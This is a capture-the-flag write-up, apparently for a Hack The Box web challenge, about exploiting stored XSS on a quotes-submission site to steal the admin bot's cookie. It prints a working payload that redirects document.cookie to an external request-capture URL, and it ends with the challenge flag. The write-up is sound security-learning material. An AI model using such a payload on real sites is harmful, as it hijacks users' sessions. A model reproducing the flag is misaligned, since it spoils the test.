# Description

We've been working hard on our new startup "Quotes Blog", a crowdsourced quotes submission platform. Can you review this application for any vulnerabilities before we launch this platform?

# Recon

Checking the website

![](Pasted%20image%2020241202183500.png)
![](Pasted%20image%2020241202183512.png)

Trying below code to test if it is vulnerable to XSS; and it is.

![](Pasted%20image%2020241203005951.png)![](Pasted%20image%2020241203010013.png)

# Exploitation

As the code suggest that admin checks the quote (i.e. visit the page.). This will be helpfull to leverage xss to get admin cookies.

![](Pasted%20image%2020241203010301.png)![](Pasted%20image%2020241203010343.png)

My first thought was to use ngrok's http for public domain but its default page shows warning first and requires paid version to view without warning hence using `requestbin`.

![](Pasted%20image%2020241203010608.png)
![](Pasted%20image%2020241203010619.png)

**Due to this restriction I am using <https://beeceptor.com/> for more alternative search requestbin (<https://pipedream.com/requestbin>)**

![](Pasted%20image%2020241203012107.png)
![](Pasted%20image%2020241203012121.png)

Creating payload for the XSS.

```
<script>document.location='https://hackthebox.free.beeceptor.com/'+document.cookie;</script>
```

![](Pasted%20image%2020241203012520.png)

When admin bot visited the site our payload redirected the cookies to public http server.

![](Pasted%20image%2020241203012535.png)

The flag is - `HTB{m0r3_th4n_ju5t_al3rts}